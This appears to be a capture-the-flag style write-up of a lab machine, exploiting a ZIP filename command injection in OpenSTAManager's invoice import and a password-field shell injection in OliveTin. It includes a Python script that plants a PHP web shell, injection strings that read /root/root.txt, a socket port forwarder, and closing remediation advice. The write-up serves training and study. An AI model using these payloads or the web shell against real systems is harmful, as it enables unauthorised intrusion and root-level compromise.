Exploit: P7M Filename Command Injection

Vulnerability: The import invoice feature processes ZIP filenames without sanitization, allowing shell metacharacters to execute arbitrary commands.

Payload Creation:

import zipfile

# Command to inject
cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"

# Malicious filename with command injection
# The quote breaks out of the intended string context
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

# Create ZIP file
with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_CONTENT")

print(f"[+] Exploit ZIP created")
print(f"[+] Filename: {malicious_filename}")
[+] Exploit ZIP created
[+] Filename: invoice.p7m";cd files && echo '<?php system($_GET["c"]); ?>' > SHELL.php;echo ".p7m

How It Works:

When the file is processed, the shell command becomes:

# Original intended: process_p7m_file('invoice.p7m');
# After injection:
process_p7m_file('invoice.p7m";cd files && echo '<?php system($_GET["c"]); ?>' > SHELL.php;echo ".p7m');

# Which executes:
cd files && echo '<?php system($_GET["c"]); ?>' > SHELL.php

Review OliveTin Configuration

cat /etc/OliveTin/config.yaml | grep -A 15 "backup_database"
- title: Backup Database
  id: backup_database
  icon: "⛁"
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  popupOnStart: execution-dialog

    - name: db_pass
      type: password
    - name: db_name
      type: ascii_identifier

Identify Vulnerability

Vulnerability: The db_pass argument is directly substituted into the shell command without escaping.

If db_pass = test'; cat /root/root.txt; echo ', the command becomes:

mysqldump -u backup_svc -p'test'; cat /root/root.txt; echo '' production > /opt/backups/backup.sql

This breaks the mysqldump command and executes arbitrary commands with root privileges.

Expose OliveTin to Network

Since OliveTin only listens on 127.0.0.1, create a port forward:

python3 << 'EOF'
import socket, threading, select

listen_socket = socket.socket()
listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listen_socket.bind(("0.0.0.0", 13371))
listen_socket.listen(5)

def handle_connection(client_socket):
    remote_socket = socket.create_connection(("127.0.0.1", 1337))
    while True:
        readable, _, _ = select.select([client_socket, remote_socket], [], [])
        for s in readable:
            data = s.recv(4096)
            if not data:
                return
            (remote_socket if s is client_socket else client_socket).sendall(data)

while True:
    client_socket, _ = listen_socket.accept()
    threading.Thread(target=handle_connection, args=(client_socket,)).start()
EOF &

Exploit Command Injection

Step 1: Open OliveTin Web Interface in Firefox: http://<TARGET_IP>:13371

Step 2: Locate the "Backup Database" action.

Step 3: Click on Backup Database — a form modal appears with three fields: db_user, db_pass (target for injection), db_name.

Step 4: In the db_pass field, enter:

test'; cat /root/root.txt; echo '

This payload:

  1. Closes the original password string with '
  2. Adds a semicolon to end the mysqldump command: ;
  3. Executes our command: cat /root/root.txt
  4. Adds another semicolon to separate commands: ;
  5. Opens a new string with echo ' to consume the trailing ' from the original template

Step 5: Click the "Start" button.

10

Remediation Summary

  1. Restrict NFS Access — Use IP whitelisting, not world access
  2. Encrypt Sensitive Documents — Don't store plaintext credentials
  3. Enforce Unique Passwords — Prevent password reuse across accounts
  4. Secure Information Flow — Don't send credentials via email
  5. Update Applications — Patch OpenSTAManager immediately
  6. Input Validation — Sanitize all user inputs, especially filenames
  7. Least Privilege — Don't run web applications as root
  8. Strong Password Policies — Enforce complexity and MFA
